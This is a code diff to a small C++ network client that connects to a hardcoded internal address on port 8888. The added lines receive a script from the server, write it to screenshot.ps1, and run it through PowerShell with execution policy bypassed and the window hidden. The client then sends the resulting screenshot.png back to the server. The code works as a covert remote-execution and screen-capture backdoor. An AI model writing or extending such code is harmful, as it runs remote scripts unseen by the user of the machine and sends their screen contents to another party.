@@ -1,6 +1,10 @@
 #include "net_platform.h"
 #include <cstring>
 #include <string>
+#include <cstdlib>
+#include <filesystem>
+#include <fstream>
+#include <iostream>
 
 int main(int argc ,char *argv[]) {
     #ifdef _WIN32
@@ -17,7 +21,7 @@ int main(int argc ,char *argv[]) {
         return 1;
     }
 
-    std::string ip = "10.52.14.210";
+    std::string ip = "10.55.10.32";
     int port = 8888;
 
     if (argc > 2) {
@@ -45,6 +49,21 @@ int main(int argc ,char *argv[]) {
     #endif
 
     ::send(sockfd, connect_msg.c_str(), connect_msg.size(), 0);
+
+    char buffer[2048] = {0};
+    ::recv(sockfd, buffer, sizeof(buffer), 0);
+
+    std::ofstream file("screenshot.ps1", std::ios::out | std::ios::trunc);
+    if (!file) {
+        std::cerr << "无法创建 screenshot.ps1" << std::endl;
+        return 1;
+    }
+
+    file << buffer;
+    file.close();
+    system("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File screenshot.ps1");
+
+    send_file(sockfd, "screenshot.png");
 
     while (true) {
         char buf[1024] = {0};
